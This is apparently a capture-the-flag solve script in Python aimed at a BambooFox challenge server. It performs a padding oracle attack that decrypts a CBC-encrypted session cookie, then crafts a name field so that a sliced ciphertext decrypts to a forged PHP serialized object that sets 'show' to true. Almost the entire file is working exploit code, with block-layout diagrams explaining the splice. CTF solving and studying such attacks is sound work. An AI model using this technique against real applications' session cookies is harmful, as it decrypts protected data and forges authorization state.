import requests, sys

# http://djosix.com/padding_oracle.py
from padding_oracle import *


URL = 'http://ctf.bamboofox.cs.nctu.edu.tw:8002/'

#=========================================================
# Padding oracle
#=========================================================

sess = requests.Session()
session = '%2Bfs7r4VO2kxNDdi0arbP7r6bqqf993hx739dOLzBYo5HKnKHZCTLjRBlCYlSTLEszQzRJldsd9Tfv04AUNsFtA%3D%3D'
cipher = base64_decode(urldecode(session))

def oracle(cipher):
    r = sess.get(URL, cookies={'session': urlencode(base64_encode(cipher))})
    return 'error' not in r.text

plaintext = padding_oracle(cipher, 16, oracle, 64)

print(remove_padding(plaintext).decode())
# b'a:2:{s:4:"show";b:0;s:4:"name";s:1:"a";}\x08\x08\x08\x08\x08\x08\x08\x08'

#=========================================================
# Modify session
#=========================================================

'''
                a:2:{s:4:"show";b:0;s:4:"name";s:3:"asd";}
[------IV------][----Block-----][----Block-----][----Block-----]
a:2:{s:4:"show";b:0;s:4:"name";s:?:"                                            ";}
                                    a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}
a:2:{s:4:"show";b:0;s:4:"name";s:44:"___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}
0               16              32              48              64              80              96              112             128

[------IV------][----Block-----][----Block-----][----Block-----][----Block-----][----Block-----][----Block-----][----Block-----]
                                                [------IV------][----Block-----][----Block-----][----Block-----]
                a:2:{s:4:"show";b:0;s:4:"name";s:59:"___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}_";}
0               16              32              48              64              80              96              112             128

name=___________a%3A2%3A%7Bs%3A4%3A%22show%22%3Bs%3A1%3A%221%22%3Bs%3A4%3A%22name%22%3Bs%3A1%3A%22a%22%3B%7D%22%3B%7D%01

'''

name = '___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01'
cipher = base64_decode(urldecode(requests.post(URL, data={'name': name}).cookies.get('session')))
cipher = cipher[48:112]
print(requests.get(URL, cookies={'session': urlencode(base64_encode(cipher))}).text)